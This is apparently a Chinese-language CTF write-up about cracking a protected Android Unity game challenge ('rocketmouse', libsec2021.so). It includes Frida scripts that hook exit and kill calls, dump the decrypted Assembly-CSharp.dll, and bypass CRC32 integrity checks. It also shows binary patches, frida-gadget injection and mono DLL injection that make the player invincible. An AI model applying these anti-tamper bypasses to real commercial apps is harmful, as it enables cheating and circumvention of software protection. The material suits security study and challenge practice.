<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDismiss</span><span class="params">(DialogInterface arg4)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">this</span>.m_str.contains(<span class="string">&quot;。&quot;</span>)) &#123;</span><br><span class="line">        System.exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Sec2021MsgBox.m_showed = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可使用frida hook该退出函数：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Java.available) &#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        Java.use(<span class="string">&quot;java.lang.System&quot;</span>).exit</span><br><span class="line">            .overload(<span class="string">&#x27;int&#x27;</span>)</span><br><span class="line">            .implementation = <span class="function"><span class="keyword">function</span> (<span class="params">code</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看<code>show</code>函数的交叉引用，最终跟踪至<code>Sec2021IPC</code>的<code>onNativeEngineResponse</code>函数，推测native层会通过JNI来调用该函数，从而弹出对话框。</p>
<h4 id="hook-native层退出函数"><a href="#hook-native层退出函数" class="headerlink" title="hook native层退出函数"></a>hook native层退出函数</h4><p>使用frida或ida附加后，除了java层弹出对话框，native层也会调用函数使程序退出。所以想要好好调试的话，得先找到这些函数。<br>使用IDA打开<code>libsec2021.so</code>，查看<code>kill</code>函数的交叉引用，发现有3个函数会调用它，如下图：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/gslab2021-pre-1.png"><br>分别查看对应函数的交叉引用，发现<code>55EC</code>没有被调用，<code>1F120</code>被多次调用，而<code>1F788</code>仅被一个函数(<code>1F6F0</code>)调用，向上寻找调用链找到<code>1FAA8</code>，该函数最终只被调用了5次，将其命名为<code>my_kill</code>。<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/gslab2021-pre-2.png"><br>可以看到在kill之前调用了sleep函数，根据经验，<code>1F6F0</code>是退出函数的可能性更大一些。<br>使用frida hook<code>kill</code>函数，并打印堆栈查看：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_c_stack</span>(<span class="params">context, str_tag</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;=============================&quot;</span> + str_tag + <span class="string">&quot; Stack strat=======================&quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(Thread.backtrace(context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join(<span class="string">&#x27;\n&#x27;</span>));</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;=============================&quot;</span> + str_tag + <span class="string">&quot; Stack end  =======================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_kill</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> addr = Module.findExportByName(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;kill&quot;</span>);</span><br><span class="line">    Interceptor.replace(addr, <span class="keyword">new</span> NativeCallback(<span class="function"><span class="keyword">function</span> (<span class="params">pid, sig</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;fake_kill() called!&quot;</span>);</span><br><span class="line">        print_c_stack(<span class="built_in">this</span>.context);</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;, <span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=============================undefined Stack strat=======================</span><br><span class="line">0xb3624a38 libsec2021.so!0x1fa38</span><br><span class="line">0xb3624a38 libsec2021.so!0x1fa38</span><br><span class="line">=============================undefined Stack end  =======================</span><br></pre></td></tr></table></figure>
<p>IDA定位到该偏移值，发现位于<code>1F788</code>函数中，且程序崩溃，使用<code>Android Studio</code>查看日志：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">backtrace:</span><br><span class="line">    #00 pc 00013ec8  /data/app/com.personal.rocketmouse-1/lib/arm/libsec2021.so</span><br><span class="line">    #01 pc 0001fa50  /data/app/com.personal.rocketmouse-1/lib/arm/libsec2021.so</span><br><span class="line">    #02 pc 00020920  /data/app/com.personal.rocketmouse-1/lib/arm/libsec2021.so</span><br><span class="line">    #03 pc 000060e0  /data/app/com.personal.rocketmouse-1/lib/arm/libsec2021.so</span><br><span class="line">    #04 pc 000224c7  /system/lib/libc.so (offset 0x1d000)</span><br></pre></td></tr></table></figure>
<p>相关代码：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/gslab2021-pre-3.png"></p>
<p>查看代码发现<code>13EC4</code>是一个内存拷贝函数，而它的目标地址是0x0，所以导致程序崩溃。由此可以确定<code>1F788</code>是退出函数，同时我们发现<code>1F120</code>被调用作为参数传入<code>13EC4</code>。使用frida hook看看<code>13EC4</code>的第二个参数是什么，具体思路为：<br>hook dlopen，然后在<code>libsec2021.so</code>加载后立即hook该函数，发现程序卡住，猜测有crc32校验，于是在<code>libmono</code>加载后再hook</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_dlopen</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> dlopenAddr = Module.findExportByName(<span class="literal">null</span>, <span class="string">&quot;dlopen&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (dlopenAddr == <span class="literal">null</span>) &#123;</span><br><span class="line">        dlopenAddr = Module.findExportByName(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Interceptor.attach(dlopenAddr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> pathptr = args[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span> (pathptr !== <span class="literal">undefined</span> &amp;&amp; pathptr != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> path = ptr(pathptr).readCString();</span><br><span class="line">                <span class="comment">// console.log(&quot;[dlopen]&quot;, path);</span></span><br><span class="line">                <span class="built_in">this</span>.can_hook_lib = <span class="literal">false</span>;</span><br><span class="line">                <span class="built_in">this</span>.can_hook_libmono = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">if</span> (path.indexOf(<span class="string">&quot;libsec2021.so&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.can_hook_lib = <span class="literal">true</span>;</span><br><span class="line">                &#125; <span class="keyword">if</span> (path.indexOf(<span class="string">&quot;libmono.so&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.can_hook_libmono = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.can_hook_lib) &#123;</span><br><span class="line">                <span class="comment">// hook_sec2021();</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.can_hook_libmono) &#123;</span><br><span class="line">                hook_sec2021();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(hook_dlopen);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_sec2021</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> libbase = Module.findBaseAddress(<span class="string">&quot;libsec2021.so&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> addr = libbase.add(<span class="number">0x13EC4</span>);</span><br><span class="line">    <span class="keyword">var</span> memcpy_ori = <span class="keyword">new</span> NativeFunction(addr, <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">    Interceptor.replace(addr, <span class="keyword">new</span> NativeCallback(<span class="function"><span class="keyword">function</span> (<span class="params">dst, src</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (dst == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> zero_replace_ptr = Memory.alloc(<span class="number">10</span>);</span><br><span class="line">            dst = zero_replace_ptr;</span><br><span class="line">            <span class="built_in">console</span>.log(Memory.readByteArray(src, <span class="number">0x10</span>));</span><br><span class="line">            <span class="keyword">return</span> dst;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> memcpy_ori(dst, src);</span><br><span class="line">    &#125;, <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出<code>diediedie</code>，由此可以得知<code>1F120</code>是一个获取字符串的函数，将其命名为<code>getstring</code>，hook看看字符串：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> string_maps = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> key = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_getstring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> libso_address = Module.findBaseAddress(<span class="string">&quot;libsec2021.so&quot;</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(libso_address);</span><br><span class="line">    <span class="keyword">var</span> addr = libso_address.add(<span class="number">0x1F120</span>);</span><br><span class="line"></span><br><span class="line">    Interceptor.attach(addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">            key = args[<span class="number">0</span>];</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> str = Memory.readUtf8String(ptr(retval));</span><br><span class="line">            <span class="keyword">if</span> (string_maps[key] == <span class="literal">null</span>) &#123;</span><br><span class="line">                string_maps[key] = str;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;getstring: &quot;</span>, key, str);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出一系列字符串，比如tcp端口检测，过签名校验类的检测，动态链接库的检测，apk签名、资源文件等。配合堆栈打印，可快速定位相关函数。当然，不需要一个一个分析，笔者是将退出函数nop掉从而实现破解。</p>
<h5 id="对话框"><a href="#对话框" class="headerlink" title="对话框"></a>对话框</h5><p>如<code>0xa44 no heart beat</code>，打印堆栈可定位到<code>1574C</code>函数：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/gslab2021-pre-4.png"><br>查看<code>14FE0</code>，分析得知是在调用<code>onNativeEngineResponse</code>函数显示对话框：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/gslab2021-pre-5.png"></p>
<h5 id="dll加载"><a href="#dll加载" class="headerlink" title="dll加载"></a>dll加载</h5><p>日志<code>0x338 Assembly-CSharp.dll</code>，可定位到<code>0x1D29C</code>函数（具体分析见下文）</p>
<h4 id="native层"><a href="#native层" class="headerlink" title="native层"></a>native层</h4><p>使用IDA打开<code>libmono.so</code>，发现关键函数<code>mono_image_open_with_name</code>被加密。程序运行起来后，使用frida对其进行内存dump，发现该函数已被解密。修复so文件结构后，使用IDA查看：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/gslab2021-pre-6.png"><br>与正常的<code>libmono.dll</code>函数对比，发现区别在于第一条B指令，于是使用IDA下断点进行动态调试，执行到了<code>libsec2021.so</code>的<code>0x1D29C</code>函数。<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/gslab2021-pre-7.png"><br>其中对文件头和文件名进行了判断，如果是<code>MZ</code>开头且路径不包含<code>Assembly-CSharp.dll</code>，则跳转至<code>0x1CF88</code>执行。否则初始化指针，并调用<code>0x1CF4C</code>中的解密算法，将<code>sec2021.png</code>的<code>0x410B</code>至末尾的数据解密，解密结果即为真正加载的<code>Assembly-CSharp.dll</code>。解密函数为<code>0x1D2A0</code>（查看调用发现也是解密so的函数）</p>
<p><code>0x1CF88</code>位置：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/gslab2021-pre-8.png"><br>这里的<code>1FAA8</code>是之前分析的<code>my_kill</code>函数，2048即状态码，用来区分检测点。<br><code>18B00</code>函数初始化了一个数组，其中存有dll文件的crc32校验码，<code>18CEC</code>函数获取dll索引，并对其进行crc32校验（<code>F3B4</code>函数），正常则返回0。（<code>18CEC</code>函数部分内容如下，修改该函数返回值即可通过该检测点）<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/gslab2021-pre-10.png"><br>查看crc32校验函数（<code>F3B4</code>）的交叉引用，可定位到<code>159A0</code>函数，修改其返回值为0即可绕过相关检测点。</p>
<p>由于 <code>mono_image_open_from_data_with_name</code>函数的第一条指令会完成解密操作，所以可以hook下一条指令（此时已完成解密），当读取到真正的<code>Assembly-CSharp.dll</code>时（通过大小判断），将其dump出来。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dump_memory</span>(<span class="params">base,size</span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> currentApplication = Java.use(<span class="string">&quot;android.app.ActivityThread&quot;</span>).currentApplication();</span><br><span class="line">        <span class="keyword">var</span> dir = currentApplication.getApplicationContext().getFilesDir().getPath();</span><br><span class="line">        <span class="keyword">var</span> file_path = dir + <span class="string">&quot;/dumpmemory.bin&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> file_handle = <span class="keyword">new</span> File(file_path, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (file_handle &amp;&amp; file_handle != <span class="literal">null</span>) &#123;</span><br><span class="line">            Memory.protect(ptr(base),size, <span class="string">&#x27;rwx&#x27;</span>);</span><br><span class="line">            <span class="keyword">var</span> libso_buffer = ptr(base).readByteArray(size);</span><br><span class="line">            file_handle.write(libso_buffer);</span><br><span class="line">            file_handle.flush();</span><br><span class="line">            file_handle.close();</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;[dump]:&quot;</span>, file_path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_mono</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> libbase = Module.findBaseAddress(<span class="string">&quot;libmono.so&quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;libbase&quot;</span>, libbase);</span><br><span class="line">    <span class="keyword">var</span> addr = Module.findExportByName(<span class="string">&quot;libmono.so&quot;</span>, <span class="string">&quot;mono_image_open_from_data_with_name&quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;mono_image_open_from_data_with_name&quot;</span>, addr);</span><br><span class="line"></span><br><span class="line">    Interceptor.attach(Module.findExportByName(<span class="string">&quot;libmono.so&quot;</span>, <span class="string">&quot;mono_image_open_from_data_with_name&quot;</span>).add(<span class="number">4</span>), &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> data = args[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">var</span> data_len = args[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (data_len == <span class="number">0x2800</span>) &#123;</span><br><span class="line">               dump_memory(data, data_len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;mono_image_open_from_data_with_name_ori() called!&quot;</span>, data, data_len);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分析-dll"><a href="#分析-dll" class="headerlink" title="分析 dll"></a>分析 dll</h3><p>使用DnSpy打开该dll，注意到<code>MouseController</code>类的碰撞检测函数<code>OnTriggerEnter2D</code>中对碰撞物体进行了判断，如果不是金币则调用<code>HitByLaser</code>函数<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/gslab2021-pre-11.png"><br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/gslab2021-pre-12.png"><br>该函数将dead属性以及对话框赋值为true，所以只需要将赋值改为false即可实现无敌</p>
<p>即将il语句<code>ldc.i4.1</code>改为<code>ldc.i4.0</code>（对应16进制的<code>17</code>改为<code>16</code>），如下图：</p>
<p><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/gslab2021-pre-13.png"><br>静态patch即可得到一个破解版的<code>Assembly-CSharp.dll</code></p>
<h3 id="修改方法"><a href="#修改方法" class="headerlink" title="修改方法"></a>修改方法</h3><p>最终采用的是方法1（不需要额外文件）</p>
<h4 id="法1-直装破解"><a href="#法1-直装破解" class="headerlink" title="法1 - 直装破解"></a>法1 - 直装破解</h4><p>替换<code>Assembly-CSharp.dll</code>文件为破解版，patch掉<code>libsec2021.so</code>的检测，使<code>mono_image_open_from_data_with_name</code>函数走正常流程，不对<code>Assembly-CSharp.dll</code>进行替换。</p>
<p>修改方法：<br>修改<code>libsec2021.so</code>，将<code>1D0BC</code>偏移处<code>BEQ loc_1CF88</code>指令替换为<code>B loc_1CF88</code>，使得非<code>MZ</code>开头的dll才去执行解密函数。而因为我们替换了dll为破解版，所以是正常的文件头，从而不会执行解密函数。</p>
<p><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/gslab2021-pre-14.png"><br>修改crc32检测函数返回值：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/gslab2021-pre-15.png"><br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/gslab2021-pre-16.png"><br>查找<code>my_kill</code>函数（<code>1FAA8</code>）的交叉引用，并将其nop<br>（测试发现nop以下两处即可）<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/gslab2021-pre-17.png"><br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/gslab2021-pre-18.png"></p>
<h4 id="法2-frida-gadget"><a href="#法2-frida-gadget" class="headerlink" title="法2 - frida-gadget"></a>法2 - frida-gadget</h4><h5 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h5><p>使用<code>lief</code>为<code>libmono.so</code>添加<code>frida-gadget</code>依赖</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> lief</span><br><span class="line"><span class="built_in">bin</span> = lief.parse(<span class="string">&quot;libmono.so&quot;</span>)</span><br><span class="line"><span class="built_in">bin</span>.add_library(<span class="string">&quot;libgadget.so&quot;</span>)</span><br><span class="line"><span class="built_in">bin</span>.write(<span class="string">&quot;libmono-patch.so&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>配置文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;interaction&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;script&quot;</span>,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/data/data/com.personal.rocketmouse/files/script.js&quot;</span>,</span><br><span class="line">    <span class="string">&quot;on_change&quot;</span>: <span class="string">&quot;reload&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>释放脚本文件到 <code>/data/data/com.personal.rocketmouse/files/script.js</code>。（无root环境需要自己编写一个so文件，并将其编辑为<code>libgadget.so</code>的依赖，释放脚本文件）</p>
<p>hook <code>mono_image_open_from_data_with_name</code>函数的下一条指令（此时已完成解密），当读取到真正的<code>Assembly-CSharp.dll</code>时（通过数据大小判断），修改<code>MouseController</code>的<code>HitByLaser</code>函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_mono</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> libbase = Module.findBaseAddress(<span class="string">&quot;libmono.so&quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;libbase&quot;</span>, libbase);</span><br><span class="line">    <span class="keyword">var</span> addr = Module.findExportByName(<span class="string">&quot;libmono.so&quot;</span>, <span class="string">&quot;mono_image_open_from_data_with_name&quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;mono_image_open_from_data_with_name&quot;</span>, addr);</span><br><span class="line"></span><br><span class="line">    Interceptor.attach(Module.findExportByName(<span class="string">&quot;libmono.so&quot;</span>, <span class="string">&quot;mono_image_open_from_data_with_name&quot;</span>).add(<span class="number">4</span>), &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> data = args[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">var</span> data_len = args[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (data_len == <span class="number">0x2800</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> arr = [<span class="number">0x16</span>];</span><br><span class="line">                Memory.writeByteArray(data.add(<span class="number">0x9e4</span>), arr);</span><br><span class="line">                Memory.writeByteArray(data.add(<span class="number">0x9f5</span>), arr);</span><br><span class="line">                Memory.writeByteArray(data.add(<span class="number">0xa01</span>), arr);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;mono_image_open_from_data_with_name_ori() called!&quot;</span>, data, data_len);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>去检测（<code>libsec2021.so</code>加载后立即hook）：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_sec2021</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> libbase = Module.findBaseAddress(<span class="string">&quot;libsec2021.so&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> addr = libbase.add(<span class="number">0x1F6F0</span>);</span><br><span class="line">    Interceptor.replace(addr, <span class="keyword">new</span> NativeCallback(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;my_kill called&quot;</span>);</span><br><span class="line">    &#125;, <span class="string">&#x27;void&#x27;</span>, []));</span><br><span class="line"></span><br><span class="line">    addr = libbase.add(<span class="number">0x159A0</span>);</span><br><span class="line">    Interceptor.replace(addr, <span class="keyword">new</span> NativeCallback(<span class="function"><span class="keyword">function</span> (<span class="params">src</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// console.log(&quot;crc check&quot;);</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;, <span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>]));</span><br><span class="line"></span><br><span class="line">    addr = libbase.add(<span class="number">0x14FE0</span>);</span><br><span class="line">    Interceptor.replace(addr, <span class="keyword">new</span> NativeCallback(<span class="function"><span class="keyword">function</span> (<span class="params">jni, mode, cstr</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;show msg:&quot;</span>, Memory.readCString(cstr));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;, <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="法3-dll注入"><a href="#法3-dll注入" class="headerlink" title="法3 - dll注入"></a>法3 - dll注入</h4><p>笔者还尝试了通过native hook的方式，使用mono api来进行dll注入。步骤如下：<br>将<code>UnityEngine.dll</code>和<code>Assembly-CSharp.dll</code>作为引用，编写一个注入dll，从而拦截<code>HitByLaser</code>方法（使用<a href="https://github.com/Misaka-Mikoto-Tech/MonoHook">MonoHook</a>，其原理为替换函数地址）</p>
<p>在native层hook <code>dlopen</code>函数，过掉<code>libsec2021.so</code>的检测，并获取<code>libmono</code>句柄，然后导出mono的api，在<code>Assembly-CSharp.dll</code>加载后，调用api加载注入dll（使用<code>VitualApp</code> 及 <code>Cydia Substrate</code>框架）</p>
<h5 id="关键代码（native层）"><a href="#关键代码（native层）" class="headerlink" title="关键代码（native层）"></a>关键代码（native层）</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> *image = orig_mono_image_open_with_name(r.c_str(), file_size(path), need_copy, status, refonly, name);</span><br><span class="line"><span class="keyword">void</span> *assembly = mono_assembly_load_from_full(image, <span class="string">&quot;UNUSED&quot;</span>, status, refonly);</span><br><span class="line">image = mono_assembly_get_image(assembly);</span><br><span class="line"><span class="keyword">void</span> *pClass = mono_class_from_name(image, <span class="string">&quot;UnityHack&quot;</span>, <span class="string">&quot;HackLoad&quot;</span>);</span><br><span class="line">hookload_method = mono_class_get_method_from_name(pClass, <span class="string">&quot;HookLoad&quot;</span>, <span class="number">0</span>);</span><br><span class="line">mono_runtime_invoke(hookload_method, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
<p>根据路径打开注入dll文件，并将其加载，之后根据类名和函数名获取相应函数，进行调用。</p>
<h5 id="关键代码（C-层）"><a href="#关键代码（C-层）" class="headerlink" title="关键代码（C#层）"></a>关键代码（C#层）</h5><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">HookLoad</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Type tTarget = <span class="keyword">typeof</span>(MouseController);</span><br><span class="line">    Type tProxy = MethodBase.GetCurrentMethod().DeclaringType;</span><br><span class="line">    <span class="comment">//反射获取函数的`MethodInfo`</span></span><br><span class="line">    <span class="built_in">string</span> methodName = <span class="string">&quot;HitByLaser&quot;</span>;</span><br><span class="line">    MethodInfo miTarget = tTarget.GetMethod(methodName, BindingFlags.Instance | BindingFlags.NonPublic);</span><br><span class="line">    MethodInfo miReplace = tProxy.GetMethod(methodName + <span class="string">&quot;Replace&quot;</span>);</span><br><span class="line">    MethodInfo miProxy = tProxy.GetMethod(methodName + <span class="string">&quot;Proxy&quot;</span>);</span><br><span class="line">    <span class="keyword">new</span> MethodHook(miTarget, miReplace, miProxy).Install();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">HitByLaserReplace</span>(<span class="params">Collider2D laserCollider</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">     UnityEngine.Debug.Log(<span class="string">&quot;HitByLaserReplace&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">HitByLaserProxy</span>(<span class="params">Collider2D laserCollider</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">     UnityEngine.Debug.Log(<span class="string">&quot;HitByLaserProxy&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="破解效果"><a href="#破解效果" class="headerlink" title="破解效果"></a>破解效果</h3><p>安装apk后，启动游戏即可。<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/gslab2021-pre-19.png"></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>一道同学出的CTF题</title>
    <url>/2019/02/03/friend-ctf/</url>
